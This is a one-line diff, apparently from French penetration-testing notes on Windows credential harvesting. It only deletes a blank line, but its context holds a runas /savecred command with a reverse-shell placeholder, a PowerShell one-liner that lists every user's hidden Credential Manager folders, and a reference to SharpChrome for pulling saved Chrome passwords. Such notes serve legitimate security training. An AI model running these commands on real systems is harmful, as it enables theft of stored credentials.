@@ -28,7 +28,6 @@ runas /savecred /user:inlanefreight\bob "COMMAND HERE | REVERSE SHELL etc"
 Get-ChildItem  'C:\Users\' -Directory | % { gci -Hidden "$($_.Fullname)\AppData\Local\Microsoft\Credentials\" -erroraction silentlycontinue; gci -Hidden "$($_.Fullname)\AppData\Roaming\Microsoft\Credentials\" -erroraction silentlycontinue }
 ```
 
-
 #### Google Chrome
 
 [SharpChrome](https://github.com/GhostPack/SharpDPAPI) peut extraire les identifiants mot de passe stockés.
